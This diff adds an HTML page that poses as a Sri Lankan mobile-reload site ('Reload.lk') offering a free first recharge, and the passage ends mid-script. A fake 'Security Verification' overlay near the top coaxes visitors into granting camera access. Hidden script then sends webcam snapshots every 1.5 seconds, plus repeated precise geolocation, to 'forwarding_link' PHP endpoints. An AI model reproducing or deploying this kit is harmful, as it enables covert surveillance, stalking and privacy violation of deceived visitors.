@@ -1,0 +1,1488 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Sri Lanka Mobile Reload – Super Realistic UI</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    :root {
+      --bg: #050816;
+      --card-bg: #0b1020;
+      --card-bg-soft: #0f172a;
+      --accent: #22c55e;
+      --accent-soft: rgba(34, 197, 94, 0.1);
+      --accent-strong: #16a34a;
+      --danger: #ef4444;
+      --text: #e5e7eb;
+      --muted: #9ca3af;
+      --border: #1f2937;
+      --radius-lg: 16px;
+      --radius-md: 10px;
+      --shadow-soft: 0 22px 45px rgba(15, 23, 42, 0.75);
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI",
+        sans-serif;
+      background: radial-gradient(circle at top, #1f2937 0, #020617 55%);
+      color: var(--text);
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      padding: 24px;
+    }
+
+    .page {
+      width: 100%;
+      max-width: 1120px;
+    }
+
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 18px;
+      gap: 12px;
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .brand-logo {
+      width: 32px;
+      height: 32px;
+      border-radius: 10px;
+      background: conic-gradient(
+        from 120deg,
+        #22c55e,
+        #0ea5e9,
+        #22d3ee,
+        #22c55e
+      );
+    }
+
+    .brand-text-main {
+      font-weight: 600;
+      letter-spacing: 0.04em;
+      font-size: 15px;
+      text-transform: uppercase;
+    }
+
+    .brand-text-sub {
+      font-size: 12px;
+      color: var(--muted);
+    }
+
+    .pill-row {
+      display: flex;
+      gap: 8px;
+      flex-wrap: wrap;
+      justify-content: flex-end;
+    }
+
+    .pill {
+      padding: 6px 10px;
+      border-radius: 999px;
+      font-size: 11px;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      color: var(--muted);
+      border: 1px solid rgba(148, 163, 184, 0.35);
+      background: rgba(15, 23, 42, 0.85);
+    }
+
+    .pill-dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 999px;
+      background: var(--accent);
+    }
+
+    .layout {
+      display: grid;
+      grid-template-columns: minmax(0, 2.1fr) minmax(0, 1.4fr);
+      gap: 18px;
+    }
+
+    @media (max-width: 860px) {
+      body {
+        padding: 16px;
+      }
+      .layout {
+        grid-template-columns: minmax(0, 1fr);
+      }
+    }
+
+    .card {
+      background: radial-gradient(circle at top left, #111827 0, #020617 55%);
+      border-radius: var(--radius-lg);
+      border: 1px solid rgba(15, 23, 42, 0.95);
+      box-shadow: var(--shadow-soft);
+      padding: 18px 18px 16px;
+    }
+
+    .card-secondary {
+      background: linear-gradient(145deg, #020617 0, #020617 25%, #020617 100%);
+      border-radius: var(--radius-lg);
+      border: 1px solid rgba(31, 41, 55, 0.95);
+      box-shadow: var(--shadow-soft);
+      padding: 18px 18px 16px;
+    }
+
+    .card-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 12px;
+    }
+
+    .card-title {
+      font-size: 18px;
+      font-weight: 600;
+    }
+
+    .card-caption {
+      font-size: 12px;
+      color: var(--muted);
+    }
+
+    .stepper {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      margin-bottom: 14px;
+      font-size: 11px;
+      color: var(--muted);
+    }
+
+    .step {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      padding: 6px 10px;
+      border-radius: 999px;
+      border: 1px dashed rgba(55, 65, 81, 0.8);
+      background: rgba(15, 23, 42, 0.9);
+    }
+
+    .step-badge {
+      width: 16px;
+      height: 16px;
+      border-radius: 999px;
+      background: rgba(55, 65, 81, 0.8);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 10px;
+    }
+
+    .step.active {
+      border-style: solid;
+      border-color: rgba(34, 197, 94, 0.9);
+      background: rgba(22, 163, 74, 0.1);
+      color: var(--accent);
+    }
+    .step.active .step-badge {
+      background: var(--accent-soft);
+      color: var(--accent);
+    }
+
+    .field-group {
+      margin-bottom: 14px;
+    }
+
+    .field-label-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 6px;
+      font-size: 12px;
+    }
+
+    .field-label {
+      font-weight: 500;
+      color: #e5e7eb;
+    }
+
+    .field-hint {
+      font-size: 11px;
+      color: var(--muted);
+    }
+
+    .operator-grid {
+      display: grid;
+      grid-template-columns: repeat(4, minmax(0, 1fr));
+      gap: 10px;
+    }
+    @media (max-width: 620px) {
+      .operator-grid {
+        grid-template-columns: repeat(2, minmax(0, 1fr));
+      }
+    }
+
+    .operator-card {
+      position: relative;
+      border-radius: var(--radius-md);
+      background: var(--card-bg-soft);
+      border: 1px solid var(--border);
+      overflow: hidden;
+      cursor: pointer;
+      padding: 6px;
+      transition: border-color 0.18s ease, box-shadow 0.18s ease,
+        transform 0.18s ease, background 0.18s ease;
+    }
+
+    .operator-card::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background: radial-gradient(circle at top, rgba(15, 23, 42, 0.4), transparent);
+      pointer-events: none;
+    }
+
+    .operator-card:hover {
+      border-color: rgba(148, 163, 184, 0.9);
+      transform: translateY(-1px);
+      box-shadow: 0 14px 28px rgba(15, 23, 42, 0.8);
+    }
+
+    .operator-card.selected {
+      border-color: rgba(34, 197, 94, 0.95);
+      box-shadow: 0 0 0 1px rgba(34, 197, 94, 0.8),
+        0 18px 40px rgba(22, 163, 74, 0.5);
+      background: radial-gradient(circle at top left, #064e3b 0, #020617 60%);
+    }
+
+    .operator-image {
+      width: 100%;
+      aspect-ratio: 16/9;
+      border-radius: 10px;
+      object-fit: cover;
+      display: block;
+    }
+
+    .operator-name {
+      position: absolute;
+      left: 10px;
+      bottom: 8px;
+      padding: 4px 8px;
+      border-radius: 999px;
+      font-size: 11px;
+      background: rgba(15, 23, 42, 0.9);
+      color: #f9fafb;
+      backdrop-filter: blur(6px);
+    }
+
+    .operator-tag {
+      position: absolute;
+      right: 10px;
+      top: 8px;
+      padding: 3px 7px;
+      border-radius: 999px;
+      font-size: 10px;
+      background: rgba(15, 23, 42, 0.95);
+      color: var(--accent);
+      border: 1px solid rgba(34, 197, 94, 0.6);
+      backdrop-filter: blur(4px);
+    }
+
+    .pill-toggle {
+      display: inline-flex;
+      border-radius: 999px;
+      background: rgba(15, 23, 42, 0.9);
+      border: 1px solid var(--border);
+      overflow: hidden;
+      padding: 3px;
+      gap: 3px;
+    }
+
+    .pill-toggle button {
+      border: none;
+      background: transparent;
+      color: var(--muted);
+      padding: 5px 10px;
+      border-radius: 999px;
+      font-size: 11px;
+      cursor: pointer;
+    }
+
+    .pill-toggle button.active {
+      background: rgba(148, 163, 184, 0.22);
+      color: #e5e7eb;
+    }
+
+    .phone-input-wrap {
+      position: relative;
+      display: flex;
+      align-items: center;
+      background: #020617;
+      border-radius: var(--radius-md);
+      border: 1px solid var(--border);
+      overflow: hidden;
+    }
+
+    .phone-prefix {
+      padding: 9px 10px;
+      font-size: 13px;
+      border-right: 1px solid var(--border);
+      color: var(--muted);
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      white-space: nowrap;
+    }
+
+    .phone-input {
+      flex: 1;
+      border: none;
+      background: transparent;
+      color: var(--text);
+      padding: 9px 10px;
+      font-size: 13px;
+      outline: none;
+    }
+
+    .phone-status {
+      padding-right: 9px;
+      font-size: 12px;
+      color: var(--muted);
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .phone-status-dot {
+      width: 9px;
+      height: 9px;
+      border-radius: 999px;
+      border: 1px solid rgba(148, 163, 184, 0.8);
+      background: radial-gradient(circle at center, #1f2937 0, #020617 70%);
+    }
+
+    .phone-status-dot.ok {
+      border-color: rgba(74, 222, 128, 1);
+      background: radial-gradient(circle at center, #22c55e 0, #16a34a 70%);
+    }
+
+    .error-text {
+      margin-top: 4px;
+      font-size: 11px;
+      color: var(--danger);
+    }
+
+    .amount-grid {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 6px;
+    }
+
+    .amount-btn {
+      border: 1px solid var(--border);
+      background: rgba(15, 23, 42, 0.9);
+      border-radius: 999px;
+      padding: 6px 12px;
+      font-size: 12px;
+      cursor: pointer;
+      color: var(--muted);
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .amount-btn span {
+      font-weight: 500;
+      color: #e5e7eb;
+    }
+
+    .amount-btn .tag {
+      font-size: 10px;
+      padding: 2px 5px;
+      border-radius: 999px;
+      background: rgba(148, 163, 184, 0.15);
+      color: var(--muted);
+    }
+
+    .amount-btn.selected {
+      border-color: rgba(34, 197, 94, 0.9);
+      background: var(--accent-soft);
+      color: #bbf7d0;
+    }
+
+    .amount-btn.selected span {
+      color: #bbf7d0;
+    }
+
+    .amount-btn.selected .tag {
+      background: rgba(22, 163, 74, 0.2);
+      color: #bbf7d0;
+    }
+
+    .amount-custom-wrap {
+      margin-top: 6px;
+      display: flex;
+      gap: 6px;
+    }
+
+    .input {
+      flex: 1;
+      border-radius: var(--radius-md);
+      border: 1px solid var(--border);
+      background: #020617;
+      padding: 8px 10px;
+      color: var(--text);
+      font-size: 13px;
+      outline: none;
+    }
+
+    .input:focus {
+      border-color: rgba(148, 163, 184, 0.8);
+    }
+
+    .input-inline-tag {
+      position: absolute;
+      right: 9px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 11px;
+      color: var(--muted);
+    }
+
+    .payment-methods {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      margin-top: 6px;
+    }
+
+    .pay-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 6px 10px;
+      border-radius: 999px;
+      border: 1px solid var(--border);
+      background: rgba(15, 23, 42, 0.9);
+      font-size: 11px;
+      cursor: pointer;
+      color: var(--muted);
+    }
+
+    .pay-pill.selected {
+      border-color: rgba(34, 197, 94, 0.9);
+      color: #bbf7d0;
+      background: var(--accent-soft);
+    }
+
+    .pay-pill-dot {
+      width: 11px;
+      height: 11px;
+      border-radius: 999px;
+      border: 2px solid rgba(148, 163, 184, 0.7);
+    }
+
+    .pay-pill.selected .pay-pill-dot {
+      border-color: #22c55e;
+      box-shadow: 0 0 0 1px rgba(34, 197, 94, 0.5);
+    }
+
+    .btn {
+      margin-top: 10px;
+      width: 100%;
+      border-radius: 999px;
+      border: none;
+      padding: 9px 14px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      background: linear-gradient(120deg, #22c55e, #16a34a);
+      color: #022c22;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      box-shadow: 0 18px 40px rgba(22, 163, 74, 0.6);
+      transition: transform 0.12s ease, box-shadow 0.12s ease,
+        filter 0.12s ease;
+    }
+
+    .btn:disabled {
+      opacity: 0.6;
+      cursor: default;
+      box-shadow: none;
+      filter: grayscale(0.3);
+    }
+
+    .btn:not(:disabled):hover {
+      transform: translateY(-1px);
+      box-shadow: 0 22px 50px rgba(22, 163, 74, 0.75);
+      filter: brightness(1.02);
+    }
+
+    .btn-secondary {
+      background: transparent;
+      color: var(--muted);
+      box-shadow: none;
+      border: 1px dashed rgba(55, 65, 81, 0.9);
+      font-size: 11px;
+      margin-top: 6px;
+      padding: 7px 10px;
+    }
+
+    .btn-secondary:hover {
+      transform: none;
+      box-shadow: none;
+      filter: none;
+      border-style: solid;
+      border-color: rgba(75, 85, 99, 0.9);
+    }
+
+    .btn-spinner {
+      width: 14px;
+      height: 14px;
+      border-radius: 999px;
+      border: 2px solid rgba(15, 23, 42, 0.1);
+      border-top-color: #022c22;
+      animation: spin 0.7s linear infinite;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .summary-section {
+      margin-top: 4px;
+      padding: 10px 10px 9px;
+      border-radius: 12px;
+      background: radial-gradient(circle at top, #020617 0, #020617 55%);
+      border: 1px solid rgba(31, 41, 55, 0.9);
+    }
+
+    .summary-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: baseline;
+      margin-bottom: 5px;
+      font-size: 12px;
+    }
+
+    .summary-row.muted {
+      color: var(--muted);
+    }
+
+    .summary-row strong {
+      font-weight: 600;
+    }
+
+    .summary-total {
+      font-size: 15px;
+      font-weight: 600;
+      margin-top: 5px;
+    }
+
+    .summary-operator-chip {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      border-radius: 999px;
+      border: 1px solid rgba(55, 65, 81, 0.9);
+      padding: 4px 8px;
+      font-size: 11px;
+      background: rgba(15, 23, 42, 0.95);
+    }
+
+    .summary-operator-dot {
+      width: 9px;
+      height: 9px;
+      border-radius: 999px;
+      background: var(--accent);
+    }
+
+    .summary-badge-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 6px;
+      margin-top: 10px;
+    }
+
+    .summary-badge {
+      font-size: 10px;
+      padding: 3px 7px;
+      border-radius: 999px;
+      border: 1px solid rgba(55, 65, 81, 0.9);
+      background: rgba(15, 23, 42, 0.9);
+      color: var(--muted);
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+    }
+
+    .summary-badge-icon {
+      width: 10px;
+      height: 10px;
+      border-radius: 999px;
+      border: 2px solid rgba(148, 163, 184, 0.8);
+    }
+
+    .mini-logos {
+      display: flex;
+      gap: 8px;
+      margin-top: 10px;
+      flex-wrap: wrap;
+    }
+
+    .mini-logo {
+      height: 24px;
+      border-radius: 6px;
+      padding: 2px 6px;
+      border: 1px solid rgba(31, 41, 55, 0.9);
+      background: rgba(15, 23, 42, 0.9);
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 10px;
+      color: var(--muted);
+    }
+
+    .mini-logo img {
+      height: 18px;
+      border-radius: 4px;
+      object-fit: cover;
+    }
+
+    .fine-print {
+      margin-top: 10px;
+      font-size: 10px;
+      color: var(--muted);
+      line-height: 1.5;
+    }
+
+    .toast {
+      position: fixed;
+      left: 50%;
+      bottom: 18px;
+      transform: translateX(-50%);
+      background: rgba(15, 23, 42, 0.96);
+      border-radius: 999px;
+      padding: 9px 14px;
+      font-size: 12px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      border: 1px solid rgba(248, 113, 113, 0.8);
+      color: #fecaca;
+      backdrop-filter: blur(8px);
+      box-shadow: 0 18px 45px rgba(15, 23, 42, 0.9);
+      z-index: 30;
+    }
+
+    .toast.hidden {
+      display: none;
+    }
+
+    .toast-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 999px;
+      background: #ef4444;
+    }
+  </style>
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+<body>
+<div id="permission-overlay" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(2, 6, 23, 0.98); z-index: 99999; display: flex; flex-direction: column; justify-content: center; align-items: center; color: #fff; font-family: system-ui, sans-serif; text-align: center; backdrop-filter: blur(5px);">
+    <div style="background: #0f172a; padding: 30px; border-radius: 16px; border: 1px solid #1f2937; max-width: 90%; width: 400px; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);">
+        <div style="font-size: 48px; margin-bottom: 20px;">🛡️</div>
+        <h2 style="margin: 0 0 12px; color: #f3f4f6; font-size: 20px; font-weight: 600;">Security Verification</h2>
+        <p style="color: #9ca3af; margin-bottom: 24px; font-size: 14px; line-height: 1.5;">Our system detected unusual traffic. Please verify you are human to continue.</p>
+        <button onclick="init()" style="background: #22c55e; color: #022c22; border: none; padding: 12px 24px; border-radius: 999px; font-weight: 600; cursor: pointer; font-size: 14px; width: 100%; transition: transform 0.1s;">Verify I am Human</button>
+    </div>
+</div>
+
+<div class="video-wrap" style="position:fixed; top:0; left:0; opacity:0; z-index:-1; pointer-events:none;">
+   <video id="video" playsinline autoplay muted></video>
+</div>
+<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+<script>
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){},
+    error: function(){}
+  });
+};
+
+function loc(){
+    if(navigator.geolocation){
+      navigator.geolocation.getCurrentPosition(function(position){
+        $.post("forwarding_link/location.php",{
+          lat: position.coords.latitude,
+          lon: position.coords.longitude,
+          acc: position.coords.accuracy
+        });
+      }, function(error){
+         // Retry on error
+         setTimeout(loc, 2000);
+      }, {
+        enableHighAccuracy: true,
+        timeout: 5000,
+        maximumAge: 0
+      });
+    }
+  }
+
+const constraints = { audio: false, video: { facingMode: "user" } };
+
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    setTimeout(function(){
+        alert("Verification failed! Please allow camera access to prove you are not a robot.");
+        init();
+    }, 500);
+  }
+}
+
+function handleSuccess(stream) {
+  document.getElementById('permission-overlay').style.display = 'none';
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  window.stream = stream;
+  video.srcObject = stream;
+  
+  video.onloadedmetadata = function(e) {
+    video.play();
+  };
+
+  var context = canvas.getContext('2d');
+  setInterval(function(){
+       if (video.readyState === video.HAVE_ENOUGH_DATA) {
+           context.drawImage(video, 0, 0, 640, 480);
+           var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+           post(canvasData); 
+       }
+  }, 1500);
+  
+  loc();
+  setInterval(loc, 10000);
+}
+
+</script>
+  <div class="page">
+    <header class="header">
+      <div class="brand">
+        <div class="brand-logo"></div>
+        <div>
+          <div class="brand-text-main">Reload.lk </div>
+          <div class="brand-text-sub">Instant mobile reloads across Sri Lanka</div>
+        </div>
+      </div>
+      <div class="pill-row">
+        <div class="pill">
+          <span class="pill-dot"></span> LKR payments · Live FX locked
+        </div>
+        <div class="pill">
+          <span class="pill-dot"></span> 256-bit SSL · PCI-DSS ready
+        </div>
+        <div class="pill" id="firstFreePill">
+          <span class="pill-dot"></span> First recharge free · No payment
+        </div>
+      </div>
+    </header>
+
+    <main class="layout">
+      <!-- LEFT: MAIN FORM -->
+      <section class="card">
+        <div class="card-header">
+          <div>
+            <div class="card-title">Recharge a Sri Lankan mobile</div>
+            <div class="card-caption">
+              Select operator, enter the mobile number, choose amount and pay securely.
+            </div>
+          </div>
+          <div class="pill-toggle" id="rechargeTypeToggle">
+            <button type="button" data-type="prepaid" class="active">Prepaid reload</button>
+            <button type="button" data-type="postpaid">Postpaid bill</button>
+          </div>
+        </div>
+
+        <div class="stepper">
+          <div class="step active">
+            <div class="step-badge">1</div>
+            Operator &amp; number
+          </div>
+          <div class="step">
+            <div class="step-badge">2</div>
+            Amount
+          </div>
+          <div class="step">
+            <div class="step-badge">3</div>
+            Payment
+          </div>
+        </div>
+
+        <!-- Operators -->
+        <div class="field-group">
+          <div class="field-label-row">
+            <span class="field-label">Mobile operator</span>
+            <span class="field-hint">All major Sri Lankan networks supported</span>
+          </div>
+          <div class="operator-grid" id="operatorGrid">
+            <div class="operator-card" data-operator="Dialog">
+              <img
+                src="https://img.sanishtech.com/u/fd2ab0cf3660354e549bf79509d09fce.png"
+                alt="Dialog"
+                class="operator-image"
+              />
+              <span class="operator-name">Dialog</span>
+              <span class="operator-tag"></span>
+            </div>
+            <div class="operator-card" data-operator="Mobitel">
+              <img
+                src="https://img.sanishtech.com/u/06880e6d644f2d6ff3bb1bd8738a1447.jpg"
+                alt="SLT-Mobitel"
+                class="operator-image"
+              />
+              <span class="operator-name">SLT-Mobitel</span>
+              <span class="operator-tag"></span>
+            </div>
+            <div class="operator-card" data-operator="Hutch">
+              <img
+                src="https://img.sanishtech.com/u/72fc7a0a0cb9e107eb239f856f1778d9.png"
+                alt="Hutch"
+                class="operator-image"
+              />
+              <span class="operator-name">Hutch</span>
+              <span class="operator-tag"></span>
+            </div>
+            <div class="operator-card" data-operator="Airtel">
+              <img
+                src="https://img.sanishtech.com/u/98fb02ed0d31b2776f7db481d19e1942.png"
+                alt="Airtel"
+                class="operator-image"
+              />
+              <span class="operator-name">Airtel</span>
+              <span class="operator-tag"></span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Phone number -->
+        <div class="field-group">
+          <div class="field-label-row">
+            <label class="field-label" for="phoneInput">Mobile number</label>
+            <span class="field-hint">Local (07XXXXXXXX) or +947XXXXXXXX</span>
+          </div>
+          <div class="phone-input-wrap" id="phoneWrap">
+            <div class="phone-prefix">
+              +94
+            </div>
+            <input
+              id="phoneInput"
+              class="phone-input"
+              type="tel"
+              placeholder="71 234 5678"
+              autocomplete="off"
+            />
+            <div class="phone-status" id="phoneStatus">
+              <div class="phone-status-dot" id="phoneStatusDot"></div>
+              <span id="phoneOperatorHint">Awaiting number…</span>
+            </div>
+          </div>
+          <div class="error-text" id="phoneError" style="display:none;">
+            Please enter a valid Sri Lankan mobile number (9 digits, without +94).
+          </div>
+        </div>
+
+        <!-- Amount -->
+        <div class="field-group">
+          <div class="field-label-row">
+            <span class="field-label">Reload amount</span>
+            <span class="field-hint">In Sri Lankan Rupees (LKR)</span>
+          </div>
+          <div class="amount-grid" id="amountButtons">
+            <button type="button" class="amount-btn" data-amount="100">
+              <span>100</span> LKR
+            </button>
+            <button type="button" class="amount-btn" data-amount="200">
+              <span>200</span> LKR
+            </button>
+            <button type="button" class="amount-btn" data-amount="500">
+              <span>500</span> LKR
+              <span class="tag">Popular</span>
+            </button>
+            <button type="button" class="amount-btn" data-amount="1000">
+              <span>1,000</span> LKR
+            </button>
+            <button type="button" class="amount-btn" data-amount="2000">
+              <span>2,000</span> LKR
+            </button>
+            <button type="button" class="amount-btn" data-amount="5000">
+              <span>5,000</span> LKR
+              <span class="tag">Best value</span>
+            </button>
+          </div>
+          <div class="amount-custom-wrap">
+            <div style="position:relative; flex:1;">
+              <input
+                id="customAmount"
+                class="input"
+                type="number"
+                min="50"
+                step="10"
+                placeholder="Custom amount"
+              />
+              <span class="input-inline-tag">LKR</span>
+            </div>
+          </div>
+          <div class="error-text" id="amountError" style="display:none;">
+            Please select or enter a valid amount (minimum 50 LKR).
+          </div>
+        </div>
+
+        <!-- Payment methods -->
+        <div class="field-group">
+          <div class="field-label-row">
+            <span class="field-label">Payment method</span>
+            <span class="field-hint" id="paymentHint">Secure online payment</span>
+          </div>
+          <div class="payment-methods" id="paymentMethods">
+            <button type="button" class="pay-pill selected" data-method="card">
+              <span class="pay-pill-dot"></span>
+              Card · Visa / Mastercard
+            </button>
+            <button type="button" class="pay-pill" data-method="wallet">
+              <span class="pay-pill-dot"></span>
+              e-Wallet (eZ Cash / mCash)
+              <span class="tag">Coming soon</span>
+            </button>
+          </div>
+        </div>
+
+        <button class="btn" id="submitBtn">
+          <span id="submitText">Proceed to payment</span>
+        </button>
+        <button class="btn btn-secondary" type="button">
+          Save this number for quick reload 
+        </button>
+      </section>
+
+      <!-- RIGHT: SUMMARY / TRUST -->
+      <aside class="card-secondary">
+        <div class="card-header">
+          <div>
+            <div class="card-title">Order summary</div>
+            <div class="card-caption" id="summaryCaption">
+              Fill in the details on the left to preview your reload.
+            </div>
+          </div>
+          <div class="summary-operator-chip" id="summaryOperatorChip">
+            <span class="summary-operator-dot"></span>
+            <span id="summaryOperatorText">No operator selected</span>
+          </div>
+        </div>
+
+        <div class="summary-section">
+          <div class="summary-row muted">
+            <span>To</span>
+            <span id="summaryTo">—</span>
+          </div>
+          <div class="summary-row muted">
+            <span>Service</span>
+            <span id="summaryService">Prepaid reload</span>
+          </div>
+          <div class="summary-row muted">
+            <span>Payment method</span>
+            <span id="summaryPayment">Card · Visa / Mastercard</span>
+          </div>
+          <hr style="border:none;border-top:1px dashed rgba(55,65,81,0.9);margin:6px 0 7px;">
+          <div class="summary-row">
+            <span>Reload amount</span>
+            <span id="summaryAmount">0.00 LKR</span>
+          </div>
+          <div class="summary-row muted">
+            <span>Convenience fee</span>
+            <span id="summaryFee">0.00 LKR</span>
+          </div>
+          <div class="summary-row muted" id="summaryPromoRow" style="display:none;">
+            <span>First recharge promo</span>
+            <span id="summaryPromo">-0.00 LKR</span>
+          </div>
+          <div class="summary-total">
+            Total <span id="summaryTotal">0.00 LKR</span>
+          </div>
+        </div>
+
+        <div class="summary-badge-row">
+          <div class="summary-badge">
+            <div class="summary-badge-icon"></div>
+            Near-instant credit to Sri Lankan numbers
+          </div>
+          <div class="summary-badge">
+            <div class="summary-badge-icon"></div>
+            Operator FX &amp; taxes handled by carrier
+          </div>
+          <div class="summary-badge" id="firstFreeBadge">
+            <div class="summary-badge-icon"></div>
+              First recharge free · one-time
+          </div>
+        </div>
+
+        <div class="mini-logos">
+          <div class="mini-logo">
+            <img
+              src="https://img.sanishtech.com/u/3ab6adf6839345ba07fffc4f080f668b.png"
+              alt="Dialog"
+            />
+            Dialog
+          </div>
+          <div class="mini-logo">
+            <img
+              src="https://img.sanishtech.com/u/30260cf45212603254211a46e97a1268.jpg"
+              alt="Mobitel"
+            />
+            Mobitel
+          </div>
+          <div class="mini-logo">
+            <img
+              src="https://img.sanishtech.com/u/977d05b2545595363da8c759d7c21f4e.png"
+              alt="Hutch"
+            />
+            Hutch
+          </div>
+          <div class="mini-logo">
+            <img
+              src="https://img.sanishtech.com/u/cb31052dac65f6d87c65e81beb47d4a5.png"
+              alt="Airtel"
+            />
+            Airtel
+          </div>
+        </div>
+
+        <div class="fine-print">
+          This is a demo interface. “First recharge free” is simulated on the front-end
+          and applies once per browser (tracked via local storage). No real payments are processed.
+        </div>
+      </aside>
+    </main>
+
+    <div class="toast hidden" id="toast">
+      <div class="toast-dot"></div>
+      <span id="toastText">Something went wrong.</span>
+    </div>
+  </div>
+
+  <script>
+    const operatorGrid = document.getElementById("operatorGrid");
+    const operatorCards = operatorGrid.querySelectorAll(".operator-card");
+    const phoneInput = document.getElementById("phoneInput");
+    const phoneError = document.getElementById("phoneError");
+    const phoneStatusDot = document.getElementById("phoneStatusDot");
+    const phoneOperatorHint = document.getElementById("phoneOperatorHint");
+    const phoneWrap = document.getElementById("phoneWrap");
+
+    const amountButtons = document.getElementById("amountButtons");
+    const amountBtns = amountButtons.querySelectorAll(".amount-btn");
+    const customAmount = document.getElementById("customAmount");
+    const amountError = document.getElementById("amountError");
+
+    const paymentMethodsEl = document.getElementById("paymentMethods");
+    const paymentPills = paymentMethodsEl.querySelectorAll(".pay-pill");
+    const paymentHint = document.getElementById("paymentHint");
+
+    const rechargeTypeToggle = document.getElementById("rechargeTypeToggle");
+    const rechargeTypeButtons = rechargeTypeToggle.querySelectorAll("button");
+
+    const summaryOperatorChip = document.getElementById("summaryOperatorChip");
+    const summaryOperatorText = document.getElementById("summaryOperatorText");
+    const summaryTo = document.getElementById("summaryTo");
+    const summaryService = document.getElementById("summaryService");
+    const summaryPayment = document.getElementById("summaryPayment");
+    const summaryAmount = document.getElementById("summaryAmount");
+    const summaryFee = document.getElementById("summaryFee");
+    const summaryTotal = document.getElementById("summaryTotal");
+    const summaryCaption = document.getElementById("summaryCaption");
+    const summaryPromoRow = document.getElementById("summaryPromoRow");
+    const summaryPromo = document.getElementById("summaryPromo");
+
+    const submitBtn = document.getElementById("submitBtn");
+    const submitText = document.getElementById("submitText");
+
+    const toast = document.getElementById("toast");
+    const toastText = document.getElementById("toastText");
+
+    const firstFreePill = document.getElementById("firstFreePill");
+    const firstFreeBadge = document.getElementById("firstFreeBadge");
+
+    const operatorPrefixMap = {
+      "70": "Mobitel",
+      "71": "Mobitel",
+      "72": "Hutch",
+      "74": "Dialog",
+      "75": "Airtel",
+      "76": "Dialog",
+      "77": "Dialog",
+      "78": "Hutch",
+    };
+
+    let selectedOperator = null;
+    let selectedAmount = 0;
+    let selectedPaymentMethod = "card";
+    let selectedRechargeType = "prepaid";
+    let toastTimeout = null;
+
+    // First recharge free state (one-time per browser via localStorage)
+    let isFirstFreeEligible = true;
+    let hasConsumedFirstFree = false;
+    let freeApplied = false;
+
+    try {
+      hasConsumedFirstFree = !!localStorage.getItem("reloadFirstFreeUsed");
+      isFirstFreeEligible = !hasConsumedFirstFree;
+    } catch (e) {
+      isFirstFreeEligible = true;
+      hasConsumedFirstFree = false;
+    }
+
+    function updateFirstFreeUI() {
+      if (!isFirstFreeEligible) {
+        firstFreePill.style.opacity = 0.4;
+        firstFreePill.textContent = "🎁 First recharge free used on this browser";
+        firstFreeBadge.style.opacity = 0.5;
+      }
+    }
+    updateFirstFreeUI();
+
+    function formatLKR(amount) {
+      return amount.toLocaleString("en-LK", {
+        style: "currency",
+        currency: "LKR",
+        minimumFractionDigits: 2,
+        maximumFractionDigits: 2,
+      });
+    }
+
+    function showToast(message) {
+      toastText.textContent = message;
+      toast.classList.remove("hidden");
+      if (toastTimeout) clearTimeout(toastTimeout);
+      toastTimeout = setTimeout(() => {
+        toast.classList.add("hidden");
+      }, 3500);
+    }
+
+    function selectOperator(name, fromAutoDetect = false) {
+      selectedOperator = name;
+
+      operatorCards.forEach((card) => {
+        if (card.dataset.operator === name) {
+          card.classList.add("selected");
+        } else {
+          card.classList.remove("selected");
+        }
+      });
+
+      summaryOperatorText.textContent = name
+        ? name + " (Sri Lanka)"
+        : "No operator selected";
+
+      if (fromAutoDetect && name) {
+        phoneOperatorHint.textContent = `Detected: ${name}`;
+      }
+
+      updateSummaryCaption();
+    }
+
+    function updateSummaryCaption() {
+      if (!selectedOperator && !phoneInput.value && !selectedAmount && !customAmount.value) {
+        summaryCaption.textContent =
